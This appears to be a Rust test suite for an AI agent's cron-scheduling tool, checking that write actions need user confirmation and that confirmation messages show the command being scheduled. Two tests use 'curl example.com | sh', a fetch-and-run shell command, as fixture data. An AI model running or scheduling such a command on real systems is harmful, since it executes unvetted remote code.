use super::*;
use crate::test_support::TestShellProxy;

fn args(json: serde_json::Value) -> String {
    json.to_string()
}

#[test]
fn action_is_required() {
    assert!(parse_request(&args(json!({}))).is_err());
}

#[test]
fn an_unknown_action_is_rejected() {
    assert!(parse_request(&args(json!({"action": "obliterate"}))).is_err());
}

#[test]
fn fields_round_trip() {
    let request = parse_request(&args(json!({
        "action": "create",
        "job": "digest",
        "schedule": "5m",
        "command": "echo hi",
    })))
    .unwrap();
    assert_eq!(request.action, Some(CronToolAction::Create));
    assert_eq!(request.job.as_deref(), Some("digest"));
    assert_eq!(request.schedule.as_deref(), Some("5m"));
    assert_eq!(request.command.as_deref(), Some("echo hi"));
}

#[test]
fn read_and_write_actions_never_need_confirmation() {
    for action in [
        CronToolAction::List,
        CronToolAction::Show,
        CronToolAction::History,
        CronToolAction::Incidents,
        CronToolAction::Status,
        CronToolAction::Doctor,
    ] {
        assert!(!action.is_write());
    }
}

#[test]
fn a_missing_required_field_is_refused_before_any_confirmation() {
    let mut proxy = TestShellProxy::default();
    let error = run(&args(json!({"action": "pause"})), &mut proxy).unwrap_err();
    assert!(error.contains("job"), "{error}");
    assert_eq!(proxy.confirm_calls, 0);
    assert!(proxy.cron_tool_calls.is_empty());
}

#[test]
fn create_without_a_schedule_is_refused_before_any_confirmation() {
    let mut proxy = TestShellProxy::default();
    let error = run(
        &args(json!({"action": "create", "command": "true"})),
        &mut proxy,
    )
    .unwrap_err();
    assert!(error.contains("schedule"), "{error}");
    assert_eq!(proxy.confirm_calls, 0);
}

#[test]
fn create_an_agent_job_is_refused() {
    let mut proxy = TestShellProxy::default();
    let error = run(
        &args(json!({"action": "create", "schedule": "5m", "agent": true})),
        &mut proxy,
    )
    .unwrap_err();
    assert!(error.contains("no longer supported"), "{error}");
}

#[test]
fn read_actions_need_no_fields_at_all() {
    for action in ["list", "history", "incidents", "status", "doctor"] {
        let mut proxy = TestShellProxy::default();
        assert!(
            run(&args(json!({"action": action})), &mut proxy).is_ok(),
            "{action} should not require any field"
        );
    }
}

/// Unlike every other job-selector action, `logs` accepts a bare `run` in
/// place of `job` - the same as `cron logs --run <id>` needing no job name
/// either, once the run itself pins it down.
#[test]
fn logs_needs_a_job_or_a_run_but_not_both() {
    let mut proxy = TestShellProxy::default();
    let error = run(&args(json!({"action": "logs"})), &mut proxy).unwrap_err();
    assert!(error.contains("job") && error.contains("run"), "{error}");

    let mut proxy = TestShellProxy::default();
    assert!(
        run(
            &args(json!({"action": "logs", "job": "digest"})),
            &mut proxy
        )
        .is_ok()
    );

    let mut proxy = TestShellProxy::default();
    assert!(
        run(
            &args(json!({"action": "logs", "run": "abc123"})),
            &mut proxy
        )
        .is_ok()
    );
}
#[test]
fn a_read_action_dispatches_without_asking() {
    let mut proxy = TestShellProxy {
        cron_tool_response: Some(json!({"jobs": []})),
        ..Default::default()
    };
    let result = run(&args(json!({"action": "list"})), &mut proxy).unwrap();
    assert_eq!(proxy.confirm_calls, 0);
    assert_eq!(proxy.cron_tool_calls.len(), 1);
    assert_eq!(result, json!({"jobs": []}).to_string());
}

#[test]
fn a_write_action_is_cancelled_when_the_user_declines() {
    let mut proxy = TestShellProxy {
        confirm_result: false,
        ..Default::default()
    };
    let result = run(
        &args(json!({"action": "pause", "job": "digest"})),
        &mut proxy,
    )
    .unwrap();
    assert!(result.contains("cancelled"));
    assert!(proxy.cron_tool_calls.is_empty());
}

#[test]
fn a_write_action_dispatches_once_the_user_agrees() {
    let mut proxy = TestShellProxy {
        confirm_result: true,
        cron_tool_response: Some(json!({"action": "pause", "job": "digest"})),
        ..Default::default()
    };
    let result = run(
        &args(json!({"action": "pause", "job": "digest"})),
        &mut proxy,
    )
    .unwrap();
    assert_eq!(proxy.cron_tool_calls.len(), 1);
    assert_eq!(
        result,
        json!({"action": "pause", "job": "digest"}).to_string()
    );
}

/// The grant check runs, and refuses, before anything is asked or
/// dispatched - a wider ask than the task's own grant is not "answer no and
/// move on", it is a hard refusal.
#[test]
fn agent_fields_are_refused_before_any_confirmation() {
    let mut proxy = TestShellProxy::default();
    let error = run(
        &args(json!({
            "action": "create",
            "schedule": "5m",
            "command": "true",
            "agent": true,
        })),
        &mut proxy,
    )
    .unwrap_err();
    assert!(error.contains("no longer supported"), "{error}");
    assert_eq!(proxy.confirm_calls, 0);
    assert!(proxy.cron_tool_calls.is_empty());
}

/// The bug this guards against: `confirm_message` used to say only "AI wants
/// to create a shell cron job on `5m`" - a person approving it could not
/// actually see what command was about to be scheduled without separately
/// running `cron show` first.
#[test]
fn create_confirmation_names_the_command_being_scheduled() {
    let request = CronToolRequest {
        action: Some(CronToolAction::Create),
        schedule: Some("5m".to_string()),
        command: Some("curl example.com | sh".to_string()),
        ..CronToolRequest::default()
    };
    let message = confirm_message(CronToolAction::Create, &request);
    assert!(message.contains("curl example.com | sh"), "{message}");
}

/// The bug this guards against: `confirm_message` for `update` used to say
/// only "AI wants to change cron job `foo`" - a person could not tell what
/// was actually being changed, including a rewritten command/goal, without
/// separately diffing `cron show` before and after.
#[test]
fn update_confirmation_names_the_fields_being_changed() {
    let request = CronToolRequest {
        action: Some(CronToolAction::Update),
        job: Some("foo".to_string()),
        command: Some("curl example.com | sh".to_string()),
        schedule: Some("1h".to_string()),
        ..CronToolRequest::default()
    };
    let message = confirm_message(CronToolAction::Update, &request);
    assert!(message.contains("curl example.com | sh"), "{message}");
    assert!(message.contains("schedule=1h"), "{message}");
}

#[test]
fn update_confirmation_with_no_field_named_has_no_stray_summary() {
    let request = CronToolRequest {
        action: Some(CronToolAction::Update),
        job: Some("foo".to_string()),
        ..CronToolRequest::default()
    };
    assert_eq!(
        confirm_message(CronToolAction::Update, &request),
        "AI wants to change cron job `foo`"
    );
}

/// The bug this guards against: `update_summary` named `schedule`/`command`/
/// `goal`/`cwd`/`on`/`timeout`/`catchup` but not `name`,
/// `max_tokens_per_day` or `check` - an update that only renamed a job or
/// raised its token ceiling produced the same generic, detail-free
/// confirmation the "show the command" fix was written to replace.
#[test]
fn update_confirmation_names_a_rename() {
    let request = CronToolRequest {
        action: Some(CronToolAction::Update),
        job: Some("foo".to_string()),
        name: Some("bar".to_string()),
        ..CronToolRequest::default()
    };
    let message = confirm_message(CronToolAction::Update, &request);
    assert!(message.contains("name=bar"), "{message}");
}
